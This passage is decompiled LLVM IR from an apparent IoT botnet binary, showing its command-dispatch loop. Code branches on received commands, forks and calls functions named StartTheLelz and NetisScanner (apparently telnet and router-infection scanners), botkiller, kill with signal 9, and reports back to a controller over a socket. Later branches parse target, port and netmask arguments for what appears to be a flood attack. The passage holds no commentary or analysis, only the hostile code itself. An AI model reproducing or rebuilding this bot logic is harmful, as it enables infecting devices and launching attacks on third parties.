  %v2_804dbc5 = call i32 @kill(i32 %v0_804dbad, i32 9)
  %v0_804dbcd = load i32, i32* @global_var_8061580.20, align 128
  %v5_804dbd2 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804dbd2, i1* %cf.global-to-local, align 1
  store i32 %v0_804dbcd, i32* %stack_var_-476, align 4
  %v2_804dbdb = call i32 @sockprintf(i32 %v0_804dbcd, i32 ptrtoint ([17 x i8]* @global_var_805f388.648 to i32))
  %v0_804dbe0 = load i32, i32* @esp, align 4
  %v2_804dbe0 = icmp ugt i32 %v0_804dbe0, -17
  store i1 %v2_804dbe0, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_8067810.647, align 16
  br label %dec_label_pc_804dbed

dec_label_pc_804dbed:                             ; preds = %dec_label_pc_804db63, %dec_label_pc_804dbba
  store i1 %v5_804db66, i1* %cf.global-to-local, align 1
  %v2_804dbf3 = load i32, i32* %v1_804db69, align 4
  store i1 false, i1* @df, align 1
  %v4_804dc10 = inttoptr i32 %v2_804dbf3 to i8*
  store i32 %v2_804dbf3, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805f399.649 to i32), i32* @edi, align 4
  %v7_804dc22 = call i32 @_strncmp(i8* %v4_804dc10, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805f399.649, i32 0, i32 0), i32 3)
  %v8_804dc22 = urem i32 %v7_804dc22, 2
  %v9_804dc22 = icmp eq i32 %v8_804dc22, 0
  %v0_804dc24 = load i1, i1* %cf.global-to-local, align 1
  %v2_804dc24 = or i1 %v0_804dc24, %v9_804dc22
  %v3_804dc24 = zext i1 %v2_804dc24 to i32
  %v4_804dc24 = load i32, i32* @edx, align 4
  %v5_804dc24 = and i32 %v4_804dc24, -256
  %v6_804dc24 = or i32 %v3_804dc24, %v5_804dc24
  %v7_804dc24 = xor i32 %v6_804dc24, 1
  store i32 %v7_804dc24, i32* %edx.global-to-local, align 4
  %v1_804dc2c = trunc i32 %v7_804dc24 to i8
  %v3_804dc2c = zext i1 %v0_804dc24 to i8
  %v15_804dc2c = icmp eq i8 %v1_804dc2c, %v3_804dc2c
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dc35 = icmp eq i1 %v15_804dc2c, false
  br i1 %v1_804dc35, label %dec_label_pc_804dcd7, label %dec_label_pc_804dc3b

dec_label_pc_804dc3b:                             ; preds = %dec_label_pc_804dbed
  %v0_804dc3b = load i32, i32* @global_var_8067810.647, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dc40 = icmp eq i32 %v0_804dc3b, 0
  %v1_804dc42 = icmp eq i1 %v1_804dc40, false
  br i1 %v1_804dc42, label %dec_label_pc_804eb69, label %dec_label_pc_804dc48

dec_label_pc_804dc48:                             ; preds = %dec_label_pc_804dc3b
  %v1_804dc48 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804dc67 = icmp eq i32 %v1_804dc48, 0
  br i1 %v4_804dc67, label %dec_label_pc_804dc8d, label %dec_label_pc_804dc70

dec_label_pc_804dc70:                             ; preds = %dec_label_pc_804dc48
  store i32 %v1_804dc48, i32* @global_var_8067810.647, align 16
  br label %dec_label_pc_804eb69

dec_label_pc_804dc8d:                             ; preds = %dec_label_pc_804dc48
  %v0_804dc8d = load i32, i32* @esp, align 4
  %v5_804dc8d = icmp ult i32 %v0_804dc8d, 12
  store i1 %v5_804dc8d, i1* %cf.global-to-local, align 1
  %v0_804dc90 = load i32, i32* @global_var_8067808.157, align 8
  store i32 %v0_804dc90, i32* %stack_var_-476, align 4
  %v1_804dc96 = call i32 @__GI_inet_ntoa(i32 %v0_804dc90)
  %v0_804dc9e = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804dc9e, i32* %edx.global-to-local, align 4
  %v5_804dca4 = icmp ult i32* %stack_var_-460, inttoptr (i32 4 to i32*)
  store i1 %v5_804dca4, i1* %cf.global-to-local, align 1
  store i32 %v0_804dc9e, i32* %stack_var_-476, align 4
  %v2_804dcae = call i32 @sockprintf(i32 %v0_804dc9e, i32 ptrtoint ([26 x i8]* @global_var_805f39c.650 to i32))
  %v5_804dcb6 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804dcb6, i1* %cf.global-to-local, align 1
  store i32 10, i32* %stack_var_-476, align 4
  %v2_804dcc5 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v5_804dccd = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804dccd, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804dcd2 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804dcd7:                             ; preds = %dec_label_pc_804dbed, %dec_label_pc_804db18
  %v2_804dcda = load i32, i32* %v1_804d7c2, align 4
  %v4_804dcf7 = inttoptr i32 %v2_804dcda to i8*
  %v7_804dd09 = call i32 @_strncmp(i8* %v4_804dcf7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805f3b6.651, i32 0, i32 0), i32 6)
  %v8_804dd09 = urem i32 %v7_804dd09, 2
  %v9_804dd09 = icmp eq i32 %v8_804dd09, 0
  %v0_804dd0b = load i1, i1* %cf.global-to-local, align 1
  %v2_804dd0b = or i1 %v0_804dd0b, %v9_804dd09
  %v3_804dd0b = zext i1 %v2_804dd0b to i32
  %v4_804dd0b = load i32, i32* %edx.global-to-local, align 4
  %v5_804dd0b = and i32 %v4_804dd0b, -256
  %v6_804dd0b = or i32 %v3_804dd0b, %v5_804dd0b
  %v7_804dd0b = xor i32 %v6_804dd0b, 1
  store i32 %v7_804dd0b, i32* %edx.global-to-local, align 4
  %v1_804dd13 = trunc i32 %v7_804dd0b to i8
  %v3_804dd13 = zext i1 %v0_804dd0b to i8
  %v15_804dd13 = icmp eq i8 %v1_804dd13, %v3_804dd13
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dd1c = icmp eq i1 %v15_804dd13, false
  br i1 %v1_804dd1c, label %dec_label_pc_804de7f, label %dec_label_pc_804dd22

dec_label_pc_804dd22:                             ; preds = %dec_label_pc_804dcd7
  %v1_804dd25 = add i32 %tmp226, 4
  %v5_804dd25 = icmp ugt i32 %tmp226, -5
  store i1 %v5_804dd25, i1* %cf.global-to-local, align 1
  %v1_804dd28 = inttoptr i32 %v1_804dd25 to i32*
  %v2_804dd28 = load i32, i32* %v1_804dd28, align 4
  store i1 false, i1* @df, align 1
  %v4_804dd45 = inttoptr i32 %v2_804dd28 to i8*
  store i32 %v2_804dd28, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805f2ce.636 to i32), i32* @edi, align 4
  %v7_804dd57 = call i32 @_strncmp(i8* %v4_804dd45, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f2ce.636, i32 0, i32 0), i32 4)
  %v8_804dd57 = urem i32 %v7_804dd57, 2
  %v9_804dd57 = icmp eq i32 %v8_804dd57, 0
  %v0_804dd59 = load i1, i1* %cf.global-to-local, align 1
  %v2_804dd59 = or i1 %v0_804dd59, %v9_804dd57
  %v3_804dd59 = zext i1 %v2_804dd59 to i32
  %v4_804dd59 = load i32, i32* %edx.global-to-local, align 4
  %v5_804dd59 = and i32 %v4_804dd59, -256
  %v6_804dd59 = or i32 %v3_804dd59, %v5_804dd59
  %v7_804dd59 = xor i32 %v6_804dd59, 1
  store i32 %v7_804dd59, i32* @edx, align 4
  %v1_804dd61 = trunc i32 %v7_804dd59 to i8
  %v3_804dd61 = zext i1 %v0_804dd59 to i8
  %v15_804dd61 = icmp eq i8 %v1_804dd61, %v3_804dd61
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dd6a = icmp eq i1 %v15_804dd61, false
  br i1 %v1_804dd6a, label %dec_label_pc_804ddbf, label %dec_label_pc_804dd6c

dec_label_pc_804dd6c:                             ; preds = %dec_label_pc_804dd22
  %v0_804dd6c = load i32, i32* @global_var_8067810.647, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dd71 = icmp eq i32 %v0_804dd6c, 0
  br i1 %v1_804dd71, label %dec_label_pc_804eb69, label %dec_label_pc_804dd79

dec_label_pc_804dd79:                             ; preds = %dec_label_pc_804dd6c
  %v0_804dd7e = load i32, i32* @esp, align 4
  %v5_804dd7e = icmp ult i32 %v0_804dd7e, 8
  store i1 %v5_804dd7e, i1* %cf.global-to-local, align 1
  store i32 %v0_804dd6c, i32* %stack_var_-476, align 4
  %v2_804dd84 = call i32 @kill(i32 %v0_804dd6c, i32 9)
  %v5_804dd8c = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804dd8c, i1* %cf.global-to-local, align 1
  %v0_804dd8f = load i32, i32* @global_var_8067808.157, align 8
  store i32 %v0_804dd8f, i32* %stack_var_-476, align 4
  %v1_804dd95 = call i32 @__GI_inet_ntoa(i32 %v0_804dd8f)
  %v0_804dd9d = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804dd9d, i32* %edx.global-to-local, align 4
  %v5_804dda3 = icmp ult i32* %stack_var_-460, inttoptr (i32 4 to i32*)
  store i1 %v5_804dda3, i1* %cf.global-to-local, align 1
  store i32 %v0_804dd9d, i32* %stack_var_-476, align 4
  %v2_804ddad = call i32 @sockprintf(i32 %v0_804dd9d, i32 ptrtoint ([23 x i8]* @global_var_805f3bc.652 to i32))
  %v0_804ddb2 = load i32, i32* @esp, align 4
  %v2_804ddb2 = icmp ugt i32 %v0_804ddb2, -17
  store i1 %v2_804ddb2, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_8067810.647, align 16
  br label %dec_label_pc_804ddbf

dec_label_pc_804ddbf:                             ; preds = %dec_label_pc_804dd22, %dec_label_pc_804dd79
  store i1 %v5_804dd25, i1* %cf.global-to-local, align 1
  %v2_804ddc5 = load i32, i32* %v1_804dd28, align 4
  store i1 false, i1* @df, align 1
  %v4_804dde2 = inttoptr i32 %v2_804ddc5 to i8*
  store i32 %v2_804ddc5, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805f399.649 to i32), i32* @edi, align 4
  %v7_804ddf4 = call i32 @_strncmp(i8* %v4_804dde2, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805f399.649, i32 0, i32 0), i32 3)
  %v8_804ddf4 = urem i32 %v7_804ddf4, 2
  %v9_804ddf4 = icmp eq i32 %v8_804ddf4, 0
  %v0_804ddf6 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ddf6 = or i1 %v0_804ddf6, %v9_804ddf4
  %v3_804ddf6 = zext i1 %v2_804ddf6 to i32
  %v4_804ddf6 = load i32, i32* @edx, align 4
  %v5_804ddf6 = and i32 %v4_804ddf6, -256
  %v6_804ddf6 = or i32 %v3_804ddf6, %v5_804ddf6
  %v7_804ddf6 = xor i32 %v6_804ddf6, 1
  store i32 %v7_804ddf6, i32* %edx.global-to-local, align 4
  %v1_804ddfe = trunc i32 %v7_804ddf6 to i8
  %v3_804ddfe = zext i1 %v0_804ddf6 to i8
  %v15_804ddfe = icmp eq i8 %v1_804ddfe, %v3_804ddfe
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804de07 = icmp eq i1 %v15_804ddfe, false
  br i1 %v1_804de07, label %dec_label_pc_804de7f, label %dec_label_pc_804de09

dec_label_pc_804de09:                             ; preds = %dec_label_pc_804ddbf
  %v0_804de09 = load i32, i32* @global_var_8067810.647, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804de0e = icmp eq i32 %v0_804de09, 0
  %v1_804de10 = icmp eq i1 %v1_804de0e, false
  br i1 %v1_804de10, label %dec_label_pc_804eb69, label %dec_label_pc_804de16

dec_label_pc_804de16:                             ; preds = %dec_label_pc_804de09
  %v1_804de16 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804de21 = icmp eq i32 %v1_804de16, 0
  br i1 %v4_804de21, label %dec_label_pc_804de47, label %dec_label_pc_804de2a

dec_label_pc_804de2a:                             ; preds = %dec_label_pc_804de16
  store i32 %v1_804de16, i32* @global_var_8067810.647, align 16
  br label %dec_label_pc_804eb69

dec_label_pc_804de47:                             ; preds = %dec_label_pc_804de16
  %v0_804de47 = load i32, i32* @esp, align 4
  %v5_804de47 = icmp ult i32 %v0_804de47, 12
  store i1 %v5_804de47, i1* %cf.global-to-local, align 1
  %v0_804de4a = load i32, i32* @global_var_8067808.157, align 8
  store i32 %v0_804de4a, i32* %stack_var_-476, align 4
  %v1_804de50 = call i32 @__GI_inet_ntoa(i32 %v0_804de4a)
  %v0_804de58 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804de58, i32* %edx.global-to-local, align 4
  %v5_804de5e = icmp ult i32* %stack_var_-460, inttoptr (i32 4 to i32*)
  store i1 %v5_804de5e, i1* %cf.global-to-local, align 1
  store i32 %v0_804de58, i32* %stack_var_-476, align 4
  %v2_804de68 = call i32 @sockprintf(i32 %v0_804de58, i32 ptrtoint ([23 x i8]* @global_var_805f3d3.653 to i32))
  %v0_804de6d = load i32, i32* @esp, align 4
  %v2_804de6d = icmp ugt i32 %v0_804de6d, -17
  store i1 %v2_804de6d, i1* %cf.global-to-local, align 1
  %v0_804de70 = call i32 @NetisScanner()
  %v0_804de75 = load i32, i32* @esp, align 4
  %v5_804de75 = icmp ult i32 %v0_804de75, 12
  store i1 %v5_804de75, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804de7a = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804de7f:                             ; preds = %dec_label_pc_804ddbf, %dec_label_pc_804dcd7
  %v2_804de82 = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804de9f = inttoptr i32 %v2_804de82 to i8*
  store i32 %v2_804de82, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805f3ea.654 to i32), i32* @edi, align 4
  %v7_804deb1 = call i32 @_strncmp(i8* %v4_804de9f, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805f3ea.654, i32 0, i32 0), i32 8)
  %v8_804deb1 = urem i32 %v7_804deb1, 2
  %v9_804deb1 = icmp eq i32 %v8_804deb1, 0
  %v0_804deb3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804deb3 = or i1 %v0_804deb3, %v9_804deb1
  %v3_804deb3 = zext i1 %v2_804deb3 to i32
  %v4_804deb3 = load i32, i32* %edx.global-to-local, align 4
  %v5_804deb3 = and i32 %v4_804deb3, -256
  %v6_804deb3 = or i32 %v3_804deb3, %v5_804deb3
  %v7_804deb3 = xor i32 %v6_804deb3, 1
  store i32 %v7_804deb3, i32* @edx, align 4
  %v1_804debb = trunc i32 %v7_804deb3 to i8
  %v3_804debb = zext i1 %v0_804deb3 to i8
  %v15_804debb = icmp eq i8 %v1_804debb, %v3_804debb
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dec4 = icmp eq i1 %v15_804debb, false
  br i1 %v1_804dec4, label %dec_label_pc_804df07, label %dec_label_pc_804dec6

dec_label_pc_804dec6:                             ; preds = %dec_label_pc_804de7f
  %v0_804dec6 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804decb = icmp eq i32 %v0_804dec6, 0
  %v1_804decd = icmp eq i1 %v1_804decb, false
  br i1 %v1_804decd, label %dec_label_pc_804df07, label %dec_label_pc_804decf

dec_label_pc_804decf:                             ; preds = %dec_label_pc_804dec6
  %v0_804decf = load i32, i32* @esp, align 4
  %v5_804decf = icmp ult i32 %v0_804decf, 12
  store i1 %v5_804decf, i1* %cf.global-to-local, align 1
  %v0_804ded2 = load i32, i32* @global_var_8067808.157, align 8
  store i32 %v0_804ded2, i32* %stack_var_-476, align 4
  %v1_804ded8 = call i32 @__GI_inet_ntoa(i32 %v0_804ded2)
  %v0_804dee0 = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804dee0, i32* %edx.global-to-local, align 4
  %v5_804dee6 = icmp ult i32* %stack_var_-460, inttoptr (i32 4 to i32*)
  store i1 %v5_804dee6, i1* %cf.global-to-local, align 1
  store i32 %v0_804dee0, i32* %stack_var_-476, align 4
  %v2_804def0 = call i32 @sockprintf(i32 %v0_804dee0, i32 ptrtoint ([29 x i8]* @global_var_805f3f2.655 to i32))
  %v0_804def5 = load i32, i32* @esp, align 4
  %v2_804def5 = icmp ugt i32 %v0_804def5, -17
  store i1 %v2_804def5, i1* %cf.global-to-local, align 1
  %v0_804def8 = call i32 @botkiller()
  %v0_804defd = load i32, i32* @esp, align 4
  %v5_804defd = icmp ult i32 %v0_804defd, 12
  store i1 %v5_804defd, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804df02 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804df07:                             ; preds = %dec_label_pc_804dec6, %dec_label_pc_804de7f
  %v2_804df0a = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804df27 = inttoptr i32 %v2_804df0a to i8*
  store i32 %v2_804df0a, i32* @esi, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_805f40f.656 to i32), i32* @edi, align 4
  %v7_804df39 = call i32 @_strncmp(i8* %v4_804df27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805f40f.656, i32 0, i32 0), i32 12)
  %v8_804df39 = urem i32 %v7_804df39, 2
  %v9_804df39 = icmp eq i32 %v8_804df39, 0
  %v0_804df3b = load i1, i1* %cf.global-to-local, align 1
  %v2_804df3b = or i1 %v0_804df3b, %v9_804df39
  %v3_804df3b = zext i1 %v2_804df3b to i32
  %v4_804df3b = load i32, i32* @edx, align 4
  %v5_804df3b = and i32 %v4_804df3b, -256
  %v6_804df3b = or i32 %v3_804df3b, %v5_804df3b
  %v7_804df3b = xor i32 %v6_804df3b, 1
  store i32 %v7_804df3b, i32* %edx.global-to-local, align 4
  %v1_804df43 = trunc i32 %v7_804df3b to i8
  %v3_804df43 = zext i1 %v0_804df3b to i8
  %v15_804df43 = icmp eq i8 %v1_804df43, %v3_804df43
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804df4c = icmp eq i1 %v15_804df43, false
  br i1 %v1_804df4c, label %dec_label_pc_804df7c, label %dec_label_pc_804df4e

dec_label_pc_804df4e:                             ; preds = %dec_label_pc_804df07
  %v0_804df4e = load i32, i32* @esp, align 4
  %v5_804df4e = icmp ult i32 %v0_804df4e, 12
  store i1 %v5_804df4e, i1* %cf.global-to-local, align 1
  %v0_804df51 = load i32, i32* @global_var_8067808.157, align 8
  %v1_804df57 = call i32 @__GI_inet_ntoa(i32 %v0_804df51)
  %v0_804df5f = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804df5f, i32* %edx.global-to-local, align 4
  %v5_804df65 = icmp ult i32* %stack_var_-476, inttoptr (i32 4 to i32*)
  store i1 %v5_804df65, i1* %cf.global-to-local, align 1
  %v2_804df6f = call i32 @sockprintf(i32 %v0_804df5f, i32 ptrtoint ([17 x i8]* @global_var_805f41b.657 to i32))
  %v0_804df74 = load i32, i32* @esp, align 4
  %v2_804df74 = icmp ugt i32 %v0_804df74, -17
  store i1 %v2_804df74, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb69

dec_label_pc_804df7c:                             ; preds = %dec_label_pc_804df07
  %v2_804df7f = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804df9c = inttoptr i32 %v2_804df7f to i8*
  store i32 %v2_804df7f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805f42c.658 to i32), i32* @edi, align 4
  %v7_804dfae = call i32 @_strncmp(i8* %v4_804df9c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f42c.658, i32 0, i32 0), i32 4)
  %v8_804dfae = urem i32 %v7_804dfae, 2
  %v9_804dfae = icmp eq i32 %v8_804dfae, 0
  %v0_804dfb0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804dfb0 = or i1 %v0_804dfb0, %v9_804dfae
  %v3_804dfb0 = zext i1 %v2_804dfb0 to i32
  %v4_804dfb0 = load i32, i32* %edx.global-to-local, align 4
  %v5_804dfb0 = and i32 %v4_804dfb0, -256
  %v6_804dfb0 = or i32 %v3_804dfb0, %v5_804dfb0
  %v7_804dfb0 = xor i32 %v6_804dfb0, 1
  store i32 %v7_804dfb0, i32* %edx.global-to-local, align 4
  %v1_804dfb8 = trunc i32 %v7_804dfb0 to i8
  %v3_804dfb8 = zext i1 %v0_804dfb0 to i8
  %v15_804dfb8 = icmp eq i8 %v1_804dfb8, %v3_804dfb8
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dfc1 = icmp eq i1 %v15_804dfb8, false
  br i1 %v1_804dfc1, label %dec_label_pc_804e287, label %dec_label_pc_804dfc7

dec_label_pc_804dfc7:                             ; preds = %dec_label_pc_804df7c
  %v9_804dfc7 = icmp ult i32 %tmp170, 5
  store i1 %v9_804dfc7, i1* %cf.global-to-local, align 1
  %v7_804dfcb = icmp sgt i32 %tmp170, 5
  br i1 %v7_804dfcb, label %dec_label_pc_804dfd1, label %dec_label_pc_804dfc7.dec_label_pc_804e0ae_crit_edge

dec_label_pc_804dfc7.dec_label_pc_804e0ae_crit_edge: ; preds = %dec_label_pc_804dfc7
  %v0_804e0b3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e0ae

dec_label_pc_804dfd1:                             ; preds = %dec_label_pc_804dfc7
  %v1_804dfd4 = add i32 %tmp226, 12
  %v1_804dfd7 = inttoptr i32 %v1_804dfd4 to i32*
  %v2_804dfd7 = load i32, i32* %v1_804dfd7, align 4
  %v0_804dfd9 = load i32, i32* @esp, align 4
  %v5_804dfd9 = icmp ult i32 %v0_804dfd9, 12
  store i1 %v5_804dfd9, i1* %cf.global-to-local, align 1
  store i32 %v2_804dfd7, i32* %stack_var_-476, align 4
  %v1_804dfdd = call i32 @atol(i32 %v2_804dfd7)
  %v5_804dfe5 = icmp ne i32 %v1_804dfdd, -1
  store i1 %v5_804dfe5, i1* %cf.global-to-local, align 1
  %v10_804dfe5 = icmp eq i32 %v1_804dfdd, -1
  br i1 %v10_804dfe5, label %dec_label_pc_804e0ae, label %dec_label_pc_804dfee

dec_label_pc_804dfee:                             ; preds = %dec_label_pc_804dfd1
  %v1_804dff1 = add i32 %tmp226, 8
  %v1_804dff4 = inttoptr i32 %v1_804dff1 to i32*
  %v2_804dff4 = load i32, i32* %v1_804dff4, align 4
  %v5_804dff6 = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804dff4, i32* %stack_var_-476, align 4
  %v1_804dffa = call i32 @atol(i32 %v2_804dff4)
  %v5_804e002 = icmp ne i32 %v1_804dffa, -1
  store i1 %v5_804e002, i1* %cf.global-to-local, align 1
  %v10_804e002 = icmp eq i32 %v1_804dffa, -1
  br i1 %v10_804e002, label %dec_label_pc_804e0ae, label %dec_label_pc_804e00b

dec_label_pc_804e00b:                             ; preds = %dec_label_pc_804dfee
  %v1_804e00e = add i32 %tmp226, 16
  %v1_804e011 = inttoptr i32 %v1_804e00e to i32*
  %v2_804e011 = load i32, i32* %v1_804e011, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e011, i32* %stack_var_-476, align 4
  %v1_804e017 = call i32 @atol(i32 %v2_804e011)
  %v5_804e01f = icmp ne i32 %v1_804e017, -1
  store i1 %v5_804e01f, i1* %cf.global-to-local, align 1
  %v10_804e01f = icmp eq i32 %v1_804e017, -1
  br i1 %v10_804e01f, label %dec_label_pc_804e0ae, label %dec_label_pc_804e028

dec_label_pc_804e028:                             ; preds = %dec_label_pc_804e00b
  %v1_804e02b = add i32 %tmp226, 20
  %v1_804e02e = inttoptr i32 %v1_804e02b to i32*
  %v2_804e02e = load i32, i32* %v1_804e02e, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e02e, i32* %stack_var_-476, align 4
  %v1_804e034 = call i32 @atol(i32 %v2_804e02e)
  %v5_804e03c = icmp ne i32 %v1_804e034, -1
  store i1 %v5_804e03c, i1* %cf.global-to-local, align 1
  %v10_804e03c = icmp eq i32 %v1_804e034, -1
  br i1 %v10_804e03c, label %dec_label_pc_804e0ae, label %dec_label_pc_804e041

dec_label_pc_804e041:                             ; preds = %dec_label_pc_804e028
  %v2_804e047 = load i32, i32* %v1_804e02e, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e047, i32* %stack_var_-476, align 4
  %v1_804e04d = call i32 @atol(i32 %v2_804e047)
  %v1_804e055 = add i32 %v1_804e04d, -65536
  %v2_804e055 = icmp ult i32 %v1_804e04d, 65536
  %v3_804e055 = sub i32 65535, %v1_804e04d
  %v4_804e055 = and i32 %v3_804e055, %v1_804e04d
  %v5_804e055 = icmp slt i32 %v4_804e055, 0
  store i1 %v2_804e055, i1* %cf.global-to-local, align 1
  %v6_804e055 = icmp eq i32 %v1_804e055, 0
  %v7_804e055 = icmp slt i32 %v1_804e055, 0
  %v3_804e05a = icmp eq i1 %v7_804e055, %v5_804e055
  %v4_804e05a = icmp eq i1 %v6_804e055, false
  %v5_804e05a = and i1 %v4_804e05a, %v3_804e05a
  br i1 %v5_804e05a, label %dec_label_pc_804e0ae, label %dec_label_pc_804e05c

dec_label_pc_804e05c:                             ; preds = %dec_label_pc_804e041
  %v2_804e062 = load i32, i32* %v1_804e02e, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e062, i32* %stack_var_-476, align 4
  %v1_804e068 = call i32 @atol(i32 %v2_804e062)
  %v1_804e070 = add i32 %v1_804e068, -65500
  %v5_804e070 = icmp ult i32 %v1_804e068, 65500
  %v6_804e070 = sub i32 65499, %v1_804e068
  %v7_804e070 = and i32 %v6_804e070, %v1_804e068
  %v8_804e070 = icmp slt i32 %v7_804e070, 0
  store i1 %v5_804e070, i1* %cf.global-to-local, align 1
  %v9_804e070 = icmp eq i32 %v1_804e070, 0
  %v10_804e070 = icmp slt i32 %v1_804e070, 0
  %v3_804e075 = icmp eq i1 %v10_804e070, %v8_804e070
  %v4_804e075 = icmp eq i1 %v9_804e070, false
  %v5_804e075 = and i1 %v4_804e075, %v3_804e075
  br i1 %v5_804e075, label %dec_label_pc_804e0ae, label %dec_label_pc_804e077

dec_label_pc_804e077:                             ; preds = %dec_label_pc_804e05c
  %v2_804e07d = load i32, i32* %v1_804e011, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e07d, i32* %stack_var_-476, align 4
  %v1_804e083 = call i32 @atol(i32 %v2_804e07d)
  %v1_804e08b = add i32 %v1_804e083, -32
  %v2_804e08b = icmp ult i32 %v1_804e083, 32
  %v3_804e08b = sub i32 31, %v1_804e083
  %v4_804e08b = and i32 %v3_804e08b, %v1_804e083
  %v5_804e08b = icmp slt i32 %v4_804e08b, 0
  store i1 %v2_804e08b, i1* %cf.global-to-local, align 1
  %v6_804e08b = icmp eq i32 %v1_804e08b, 0
  %v7_804e08b = icmp slt i32 %v1_804e08b, 0
  %v3_804e08e = icmp eq i1 %v7_804e08b, %v5_804e08b
  %v4_804e08e = icmp eq i1 %v6_804e08b, false
  %v5_804e08e = and i1 %v4_804e08e, %v3_804e08e
  br i1 %v5_804e08e, label %dec_label_pc_804e0ae, label %dec_label_pc_804e090

dec_label_pc_804e090:                             ; preds = %dec_label_pc_804e077
  %v8_804e090 = icmp ult i32 %tmp170, 7
  store i1 %v8_804e090, i1* %cf.global-to-local, align 1
  %v12_804e090 = icmp eq i32 %tmp170, 7
  %v1_804e094 = icmp eq i1 %v12_804e090, false
  br i1 %v1_804e094, label %dec_label_pc_804e0c9, label %dec_label_pc_804e096

dec_label_pc_804e096:                             ; preds = %dec_label_pc_804e090
  %v1_804e099 = add i32 %tmp226, 24
  %v1_804e09c = inttoptr i32 %v1_804e099 to i32*
  %v2_804e09c = load i32, i32* %v1_804e09c, align 4
  store i1 %v5_804dff6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e09c, i32* %stack_var_-476, align 4
  %v1_804e0a2 = call i32 @atol(i32 %v2_804e09c)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp241 = icmp slt i32 %v1_804e0a2, 1
  %tmp242 = icmp eq i1 %tmp241, false
  br i1 %tmp242, label %dec_label_pc_804e0c9, label %dec_label_pc_804e0ae

dec_label_pc_804e0ae:                             ; preds = %dec_label_pc_804dfc7.dec_label_pc_804e0ae_crit_edge, %dec_label_pc_804e096, %dec_label_pc_804e077, %dec_label_pc_804e05c, %dec_label_pc_804e041, %dec_label_pc_804e028, %dec_label_pc_804e00b, %dec_label_pc_804dfee, %dec_label_pc_804dfd1
  %v0_804e0b3 = phi i32 [ %v0_804e0b3.pre, %dec_label_pc_804dfc7.dec_label_pc_804e0ae_crit_edge ], [ %v15_804d7b9, %dec_label_pc_804e096 ], [ %v15_804d7b9, %dec_label_pc_804e077 ], [ %v15_804d7b9, %dec_label_pc_804e05c ], [ %v15_804d7b9, %dec_label_pc_804e041 ], [ %v15_804d7b9, %dec_label_pc_804e028 ], [ %v15_804d7b9, %dec_label_pc_804e00b ], [ %v15_804d7b9, %dec_label_pc_804dfee ], [ %v15_804d7b9, %dec_label_pc_804dfd1 ]
  %v0_804e0ae = load i32, i32* @global_var_8061580.20, align 128
  %v5_804e0b3 = icmp ult i32 %v0_804e0b3, 8
